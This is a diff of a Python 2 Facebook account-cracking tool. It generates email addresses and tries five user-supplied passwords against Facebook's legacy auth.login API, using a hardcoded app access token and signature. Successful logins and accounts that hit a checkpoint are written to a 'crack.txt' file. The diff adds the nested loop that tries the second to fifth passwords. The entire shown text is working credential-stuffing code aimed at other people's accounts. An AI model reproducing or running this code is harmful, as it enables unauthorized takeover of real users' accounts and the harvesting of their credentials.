@@ -99,7 +99,7 @@ logo='''
   \033[1;93m   / _ \ | '_ \ / _` |/ _` |/ _` |\  /| | | |
   \033[1;95m  / ___ \| | | | (_| | (_| | (_| |/  \| |_| |
   \033[1;96m /_/   \_\_| |_|\__, |\__, |\__,_/_/\_\____/ 
-  \033[1;91m                |___/ |___/                        
+   \033[1;91m                |___/ |___/                        
 \033[1;97m--------------------------------------------------
 \033[1;97m  [\033[1;93m*\033[1;97m] Author  : Angga Kurniawan
 \033[1;97m  [\033[1;93m*\033[1;97m] Version : 2.9
@@ -138,6 +138,8 @@ def pilih():
         old()
     elif anggaxd == '4' or anggaxd == '04':
         fb()     
+####FBOLD######
+
 ####EMAIL######
 def mail():
     os.system('clear')
@@ -178,11 +180,11 @@ def cemail():
     else:
         print '[!] Fill in correctly'
         cemail()  
-    junee = raw_input('[\033[1;92m+\033[1;97m] Password 1 \033[1;91m: \033[1;97m')
-    junee = raw_input('[\033[1;92m+\033[1;97m] Password 2 \033[1;91m: \033[1;97m')
-    junee = raw_input('[\033[1;92m+\033[1;97m] Password 3 \033[1;91m: \033[1;97m')
-    junee = raw_input('[\033[1;92m+\033[1;97m] Password 4 \033[1;91m: \033[1;97m')
-    junee = raw_input('[\033[1;92m+\033[1;97m] Password 5 \033[1;91m: \033[1;97m')
+    pass1 = raw_input('[\033[1;92m+\033[1;97m] Password 1 \033[1;91m: \033[1;97m')
+    pass2 = raw_input('[\033[1;92m+\033[1;97m] Password 2 \033[1;91m: \033[1;97m')
+    pass3 = raw_input('[\033[1;92m+\033[1;97m] Password 3 \033[1;91m: \033[1;97m')
+    pass4 = raw_input('[\033[1;92m+\033[1;97m] Password 4 \033[1;91m: \033[1;97m')
+    pass5 = raw_input('[\033[1;92m+\033[1;97m] Password 5 \033[1;91m: \033[1;97m')
     print "\033[1;97m--------------------------------------------------"
     xxx = str(len(id))
     psb ('[\033[1;93m+\033[1;97m] Total Numbers: '+xxx)
@@ -200,22 +202,85 @@ def cemail():
         except OSError:
             pass
         try:
-			pass1 = junee
 			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			q = json.load(data)
 			if 'access_token' in q:
 				print '\x1b[1;97m[\033[1;92mSuccessful\033[1;97m] ' + k + c + user + ' ◐ ' + pass1
-				okb = open('anggaxd/crack.txt', 'a')
-				okb.write(k+c+user+ ' ◐ ' +pass1+'\n')
+				okb = open('junee/crack.txt', 'a')
+				okb.write(k+c+user+pass1+'\n')
 				okb.close()
 				oks.append(c+user+pass1)
 			else:
 				if 'www.facebook.com' in q['error_msg']:
 					print '\033[1;97m[\033[1;93mCheckpoint\033[1;97m] ' + k + c + user + ' ◐ ' + pass1
-					cps = open('anggaxd/crack.txt', 'a')
-					cps.write(k+c+user+ ' ◐ ' +pass1+'\n')
+					cps = open('junee/crack.txt', 'a')
+					cps.write(k+c+user+pass1+'\n')
 					cps.close()
 					cpb.append(c+user+pass1)
+				else:
+					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+					q = json.load(data)
+					if 'access_token' in q:
+						print '\x1b[1;97m[\033[1;92mSuccessful\033[1;97m] ' + k + c + user + ' ◐ ' + pass2
+						okb = open('junee/crack.txt', 'a')
+						okb.write(k+c+user+pass2+'\n')
+						okb.close()
+						oks.append(c+user+pass2)
+					else:
+						if 'www.facebook.com' in q['error_msg']:
+							print '\033[1;97m[\033[1;93mCheckpoint\033[1;97m] ' + k + c + user + ' ◐ ' + pass2
+							cps = open('junee/crack.txt', 'a')
+							cps.write(k+c+user+pass2+'\n')
+							cps.close()
+							cpb.append(c+user+pass2)
+						else:
+							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+							q = json.load(data)
+							if 'access_token' in q:
+								print '\x1b[1;97m[\033[1;92mSuccessful\033[1;97m] ' + k + c + user + ' ◐ ' + pass3
+								okb = open('junee/crack.txt', 'a')
+								okb.write(k+c+user+pass3+'\n')
+								okb.close()
+								oks.append(c+user+pass3)
+							else:
+								if 'www.facebook.com' in q['error_msg']:
+									print '\033[1;97m[\033[1;93mCheckpoint\033[1;97m] ' + k + c + user + ' ◐ ' + pass3
+									cps = open('junee/crack.txt', 'a')
+									cps.write(k+c+user+pass3+'\n')
+									cps.close()
+									cpb.append(c+user+pass3)
+								else:
+									data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+									q = json.load(data)
+									if 'access_token' in q:
+										print '\x1b[1;97m[\033[1;92mSuccessful\033[1;97m] ' + k + c + user + ' ◐ ' + pass4
+										okb = open('junee/crack.txt', 'a')
+										okb.write(k+c+user+pass4+'\n')
+										okb.close()
+										oks.append(c+user+pass4)
+									else:
+										if 'www.facebook.com' in q['error_msg']:
+											print '\033[1;97m[\033[1;93mCheckpoint\033[1;97m] ' + k + c + user + ' ◐ ' + pass4
+											cps = open('junee/crack.txt', 'a')
+											cps.write(k+c+user+pass4+'\n')
+											cps.close()
+											cpb.append(c+user+pass4)
+										else:
+											data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+											q = json.load(data)
+											if 'access_token' in q:
+												print '\x1b[1;97m[\033[1;92mSuccessful\033[1;97m] ' + k + c + user + ' ◐ ' + pass5
+												okb = open('junee/crack.txt', 'a')
+												okb.write(k+c+user+pass5+'\n')
+												okb.close()
+												oks.append(c+user+pass5)
+											else:
+												if 'www.facebook.com' in q['error_msg']:
+													print '\033[1;97m[\033[1;93mCheckpoint\033[1;97m] ' + k + c + user + ' ◐ ' + pass5
+													cps = open('junee/crack.txt', 'a')
+													cps.write(k+c+user+pass5+'\n')
+													cps.close()
+													cpb.append(c+user+pass5)
 		
         except:
             pass
